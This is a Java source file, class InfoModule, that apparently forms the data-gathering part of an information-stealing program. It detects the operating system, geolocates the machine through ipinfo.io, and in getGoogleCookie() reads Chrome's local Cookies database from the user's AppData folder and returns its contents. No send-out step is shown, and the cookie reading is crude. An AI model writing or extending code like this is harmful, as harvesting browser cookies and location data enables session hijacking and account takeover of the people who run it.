package application.modules;

import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

public class InfoModule {

    public String getPCPlatform() {
        String osName = System.getProperty("os.name").toLowerCase();
        if (osName.contains("linux")) return "Linux";
        if (osName.contains("unix")) return "Unix";
        if (osName.contains("solaris")) return "Solaris";
        if (osName.contains("sunos")) return "Sunos";
        if (osName.contains("win")) return "Windows";
        if (osName.contains("mac")) return "Mac";
        return "Неизвестна";
    }

    public String getOriginalJson() throws IOException {

        String result = "";

        try (Scanner scanner = new Scanner(new URL("https://ipinfo.io/json").openStream(),
                StandardCharsets.UTF_8.toString()))
        {

            scanner.useDelimiter("\\A");
            result = scanner.hasNext() ? result += scanner.next() : "";
        }

        return result;

    }

    public String getDataByIp(String keyWord) throws IOException, ParseException {
        Map<String, String> yeah = new HashMap<>();

        JSONParser jsonParser = new JSONParser();
        JSONObject jsonObject = (org.json.simple.JSONObject) jsonParser.parse(getOriginalJson());

        String city = (String) jsonObject.get("city");
        String region = (String) jsonObject.get("region");
        String country = (String) jsonObject.get("country");
        String timezone = (String) jsonObject.get("timezone");

        yeah.put("city", city);
        yeah.put("region", region);
        yeah.put("country", country);
        yeah.put("timezone", timezone);

        String value = '`' + yeah.get(keyWord) + '`';

        return value;
    }

    public String getGoogleCookie() throws IOException {


        BufferedReader reader;
        String resultCookie = "";


        reader = new BufferedReader(new FileReader("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"));
        String line = reader.readLine();

        while (line != null) {
            System.out.println(line);
            line = reader.readLine();
            resultCookie += line;
        }

        reader.close();

        return resultCookie;

    }



}
